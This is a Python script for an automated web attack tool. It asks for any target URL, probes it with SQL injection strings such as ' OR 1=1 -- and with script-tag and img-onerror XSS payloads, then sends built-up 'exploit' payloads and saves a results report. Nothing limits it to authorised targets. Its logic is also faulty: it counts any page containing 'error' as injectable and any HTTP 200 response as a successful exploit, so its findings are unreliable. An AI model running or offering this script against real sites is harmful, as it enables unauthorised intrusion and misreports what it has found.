import requests
from time import sleep
from bs4 import BeautifulSoup

class AutoExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.payloads = []
        self.exploit_results = []

    def scan_for_vulnerabilities(self):
        print("[*] Scanning target for vulnerabilities...")
        self.scan_sql_injection()
        self.scan_xss()

    def scan_sql_injection(self):
        test_payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR "" = "']
        for payload in test_payloads:
            url = self.target_url + "?id=" + payload
            print(f"[*] Testing SQLi with payload: {payload}")
            response = requests.get(url)
            if "error" in response.text.lower():
                self.vulnerabilities.append({"type": "SQL Injection", "payload": payload, "url": url})
                print(f"[+] SQL Injection vulnerability found with payload: {payload}")

    def scan_xss(self):
        test_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)' />"]
        for payload in test_payloads:
            url = self.target_url + "?q=" + payload
            print(f"[*] Testing XSS with payload: {payload}")
            response = requests.get(url)
            if payload in response.text:
                self.vulnerabilities.append({"type": "XSS", "payload": payload, "url": url})
                print(f"[+] XSS vulnerability found with payload: {payload}")

    def generate_payloads(self):
        print("[*] Generating payloads...")
        for vulnerability in self.vulnerabilities:
            if vulnerability["type"] == "SQL Injection":
                self.generate_sql_payload(vulnerability)
            elif vulnerability["type"] == "XSS":
                self.generate_xss_payload(vulnerability)

    def generate_sql_payload(self, vuln):
        payload = f"SELECT * FROM users WHERE username = '{vuln['payload']}'"
        self.payloads.append({"type": "SQL Injection", "payload": payload, "vulnerability": vuln})
        print(f"[*] Generated SQL Injection payload: {payload}")

    def generate_xss_payload(self, vuln):
        payload = f"<script>alert('XSS Test')</script>"
        self.payloads.append({"type": "XSS", "payload": payload, "vulnerability": vuln})
        print(f"[*] Generated XSS payload: {payload}")

    def test_exploits(self):
        print("[*] Testing exploits on the target...")
        for payload in self.payloads:
            self.execute_payload(payload)

    def execute_payload(self, payload):
        print(f"[*] Executing payload: {payload['payload']}")
        if payload["type"] == "SQL Injection":
            response = requests.get(payload["vulnerability"]["url"] + "&id=" + payload["payload"])
            if response.status_code == 200:
                self.exploit_results.append(f"[+] SQL Injection exploit successful: {payload['payload']}")
                print(f"[+] SQL Injection exploit successful: {payload['payload']}")
            else:
                self.exploit_results.append(f"[-] SQL Injection exploit failed: {payload['payload']}")
                print(f"[-] SQL Injection exploit failed: {payload['payload']}")
        elif payload["type"] == "XSS":
            response = requests.get(payload["vulnerability"]["url"] + "&q=" + payload["payload"])
            if payload["payload"] in response.text:
                self.exploit_results.append(f"[+] XSS exploit successful: {payload['payload']}")
                print(f"[+] XSS exploit successful: {payload['payload']}")
            else:
                self.exploit_results.append(f"[-] XSS exploit failed: {payload['payload']}")
                print(f"[-] XSS exploit failed: {payload['payload']}")

    def generate_report(self):
        report = "\n[*] Exploit Test Results\n"
        for result in self.exploit_results:
            report += result + "\n"
        with open("exploit_report.txt", "w") as f:
            f.write(report)
        print("[*] Exploit report saved as 'exploit_report.txt'.")

# Usage
if __name__ == '__main__':
    target = input("Enter the target URL (e.g., http://example.com/page): ")
    auto_exploit = AutoExploit(target)
    auto_exploit.scan_for_vulnerabilities()
    auto_exploit.generate_payloads()
    auto_exploit.test_exploits()
    auto_exploit.generate_report()

